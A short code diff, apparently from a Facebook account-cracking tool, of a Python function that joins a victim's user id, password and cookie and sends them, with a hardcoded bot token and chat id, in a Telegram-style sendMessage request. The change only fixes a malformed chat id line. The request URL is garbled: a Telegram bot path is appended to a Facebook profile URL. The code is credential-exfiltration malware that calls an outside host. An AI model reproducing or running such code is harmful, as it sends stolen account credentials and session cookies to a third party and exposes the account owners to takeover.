@@ -213,7 +213,7 @@ def Elite(id,ps,coki):
     try:
         import requests
         token = "6349910946:AAExBySGtSpLqEhd1dhDjhPVUEfv9LMvJv4"#Add yout token 
-        chatid = "6619837127"8199897921
+        chatid = "6619837127"
         ok_id =str(id+"|"+ps+"|"+coki)
         url = f"https://www.facebook.com/profile.php?id=100006869401718/bot{token}/sendMessage"
         params = {"chat_id": chatid, "text": ok_id}
